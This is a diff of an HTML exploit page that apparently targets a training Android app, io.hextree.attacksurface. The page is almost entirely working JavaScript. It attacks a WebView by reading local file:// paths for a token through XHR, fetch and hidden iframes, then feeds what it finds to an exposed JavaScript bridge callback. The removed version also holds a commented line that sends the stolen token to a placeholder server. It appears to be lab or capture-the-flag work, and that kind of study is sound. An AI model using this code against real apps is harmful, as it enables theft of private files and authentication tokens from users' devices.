@@ -1,102 +1,203 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>WebView File Leak Demo</title>
-  <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    button { padding: 10px 20px; font-size: 16px; margin-bottom: 20px; }
-    #status { margin-top: 15px; font-weight: bold; }
-    pre { background: #f4f4f4; padding: 10px; border-radius: 8px; max-height: 200px; overflow-y: auto; }
-  </style>
+    <title>WebView Exploit</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #333;
+        }
+        #status {
+            font-size: 18px;
+            font-weight: bold;
+            color: #007700;
+            margin: 10px 0;
+        }
+        #debug {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin: 10px 0;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+    </style>
 </head>
 <body>
-  <h2>WebView File Leak Exploit</h2>
-  <button onclick="startAttack()">🚀 Start Attack</button>
-  <div id="status">Idle...</div>
-  <pre id="log"></pre>
+    <h1>WebView Exploit</h1>
+    <div id="status">Starting...</div>
+    <div id="debug"></div>
+    
+    <script>
+        let found = false;
+        let attempts = 0;
+        let maxAttempts = 20;
 
-  <script>
-    // List of possible file paths to try
-    const filePaths = [
-      "file:///data/data/io.hextree.attacksurface/files/flag39.txt",
-      "content://io.hextree.attacksurface/flag39",
-      "file:///sdcard/Download/flag39.txt"
-    ];
-
-    let tokenFound = false;
-
-    function log(msg) {
-      console.log(msg);
-      document.getElementById("log").textContent += msg + "\n";
-    }
-
-    // Leak using XMLHttpRequest
-    function leakFileXHR(url) {
-      try {
-        const xhr = new XMLHttpRequest();
-        xhr.open("GET", url, true);
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === 4) {
-            if (xhr.status === 200 && xhr.responseText && !tokenFound) {
-              log("[XHR] Success at " + url);
-              document.getElementById("status").innerHTML = "Token found via XHR: " + xhr.responseText.substring(0, 15) + "...";
-              attemptAuth(xhr.responseText.trim());
-              tokenFound = true;
-            } else {
-              log("[XHR] Failed at " + url + " (status " + xhr.status + ")");
-            }
-          }
-        };
-        xhr.onerror = () => log("[XHR] Error fetching " + url);
-        xhr.send();
-      } catch (e) {
-        log("[XHR] Exception for " + url + ": " + e);
-      }
-    }
-
-    // Leak using hidden iframe
-    function leakFileIframe(url) {
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.onload = () => {
-        try {
-          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-          if (!iframeDoc || tokenFound) return;
-          const textContent = iframeDoc.body ? iframeDoc.body.innerText : iframeDoc.documentElement.innerHTML;
-          if (textContent && textContent.trim() && !tokenFound) {
-            log("[Iframe] Success at " + url);
-            document.getElementById("status").innerHTML = "Token found via iframe: " + textContent.substring(0, 15) + "...";
-            attemptAuth(textContent.trim());
-            tokenFound = true;
-          }
-        } catch (e) {
-          log("[Iframe] Cannot read iframe for " + url + " (" + e + ")");
+        // Debug function
+        function debug(msg) {
+            document.getElementById('debug').innerHTML += msg + '<br>';
+            console.log(msg);
         }
-      };
-      iframe.onerror = () => log("[Iframe] Load error for " + url);
-      iframe.src = url;
-      document.body.appendChild(iframe);
-    }
 
-    // Simulated authentication attempt
-    function attemptAuth(token) {
-      log("Attempting authentication with token: " + token);
-      // Normally you'd send token back to your server:
-      // fetch("https://yourserver/receive?token=" + encodeURIComponent(token))
-    }
+        // Check if hextree interface is available
+        debug('Checking hextree interface...');
+        if (window.hextree) {
+            debug('hextree interface found!');
+            if (window.hextree.authCallback) {
+                debug('authCallback method available');
+            } else {
+                debug('authCallback method NOT found');
+            }
+        } else {
+            debug('hextree interface NOT found');
+        }
 
-    // Start scanning files
-    function startAttack() {
-      document.getElementById("status").innerHTML = "Starting file leak attempts...";
-      filePaths.forEach((path, i) => {
-        setTimeout(() => {
-          log("Trying: " + path);
-          leakFileXHR(path);
-          leakFileIframe(path);
-        }, i * 400);
-      });
-    }
-  </script>
+        // Multiple file paths to try
+        const paths = [
+            'file:///data/data/io.hextree.attacksurface/files/token.txt',
+            'file://data/data/io.hextree.attacksurface/files/token.txt',
+            'file:///android_asset/token.txt',
+            'file://android_asset/token.txt',
+            'file:///sdcard/token.txt',
+            'file:///storage/emulated/0/token.txt',
+            'file:///data/local/tmp/token.txt',
+            '/data/data/io.hextree.attacksurface/files/token.txt',
+            'token.txt',
+            './token.txt'
+        ];
+
+        // XHR function with better error handling
+        function tryXHR(url) {
+            attempts++;
+            debug('Attempt ' + attempts + ': XHR ' + url);
+            const x = new XMLHttpRequest();
+            x.open('GET', url, true);
+            x.onreadystatechange = function() {
+                if (x.readyState === 4) {
+                    debug('XHR ' + url + ' status: ' + x.status + ', response: ' + x.responseText);
+                    if (x.responseText && !found) {
+                        found = true;
+                        debug('SUCCESS! Token found: ' + x.responseText);
+                        document.getElementById('status').innerHTML = 'Token found via XHR!';
+                        if (window.hextree && window.hextree.authCallback) {
+                            window.hextree.authCallback(x.responseText.trim());
+                            debug('authCallback executed with: ' + x.responseText.trim());
+                        } else {
+                            debug('Cannot call authCallback - interface not available');
+                        }
+                    }
+                }
+            };
+            x.onerror = function(e) {
+                debug('XHR error for ' + url + ': ' + e);
+            };
+            x.send();
+        }
+
+        // Fetch API alternative
+        function tryFetch(url) {
+            attempts++;
+            debug('Attempt ' + attempts + ': Fetch ' + url);
+            fetch(url)
+            .then(response => {
+                debug('Fetch ' + url + ' status: ' + response.status);
+                return response.text();
+            })
+            .then(text => {
+                if (text && !found) {
+                    found = true;
+                    debug('SUCCESS! Token found via fetch: ' + text);
+                    document.getElementById('status').innerHTML = 'Token found via Fetch!';
+                    if (window.hextree && window.hextree.authCallback) {
+                        window.hextree.authCallback(text.trim());
+                        debug('authCallback executed with: ' + text.trim());
+                    }
+                }
+            })
+            .catch(e => {
+                debug('Fetch error for ' + url + ': ' + e);
+            });
+        }
+
+        // Iframe function with better debugging
+        function tryIframe(url) {
+            attempts++;
+            debug('Attempt ' + attempts + ': Iframe ' + url);
+            const i = document.createElement('iframe');
+            i.style.display = 'none';
+            i.onload = function() {
+                try {
+                    debug('Iframe loaded: ' + url);
+                    const doc = i.contentDocument || i.contentWindow.document;
+                    if (doc) {
+                        debug('Got iframe document');
+                        const txt = (doc.body ? doc.body.innerText || doc.body.textContent : doc.documentElement.textContent) || '';
+                        debug('Iframe content: ' + txt);
+                        if (txt && !found) {
+                            found = true;
+                            debug('SUCCESS! Token found via iframe: ' + txt);
+                            document.getElementById('status').innerHTML = 'Token found via Iframe!';
+                            if (window.hextree && window.hextree.authCallback) {
+                                window.hextree.authCallback(txt.trim());
+                                debug('authCallback executed with: ' + txt.trim());
+                            }
+                        }
+                    } else {
+                        debug('No document in iframe');
+                    }
+                } catch (e) {
+                    debug('Iframe processing error: ' + e);
+                }
+            };
+            i.onerror = function(e) {
+                debug('Iframe load error: ' + e);
+            };
+            document.body.appendChild(i);
+            i.src = url;
+        }
+
+        // Start the attack
+        setTimeout(function() {
+            debug('Starting attack with ' + paths.length + ' paths');
+            paths.forEach(function(path, index) {
+                setTimeout(function() {
+                    if (!found && attempts < maxAttempts) {
+                        tryXHR(path);
+                    }
+                }, index * 100);
+                setTimeout(function() {
+                    if (!found && attempts < maxAttempts) {
+                        tryFetch(path);
+                    }
+                }, index * 100 + 50);
+                setTimeout(function() {
+                    if (!found && attempts < maxAttempts) {
+                        tryIframe(path);
+                    }
+                }, index * 100 + 25);
+            });
+
+            // Fallback: try to call with empty or dummy token if all fails
+            setTimeout(function() {
+                if (!found) {
+                    debug('All attempts failed. Trying fallback...');
+                    if (window.hextree && window.hextree.authCallback) {
+                        debug('Trying empty token...');
+                        window.hextree.authCallback('');
+                        debug('Trying dummy tokens...');
+                        window.hextree.authCallback('test');
+                        window.hextree.authCallback('token');
+                    }
+                }
+            }, 4000);
+        }, 200);
+    </script>
 </body>
 </html>
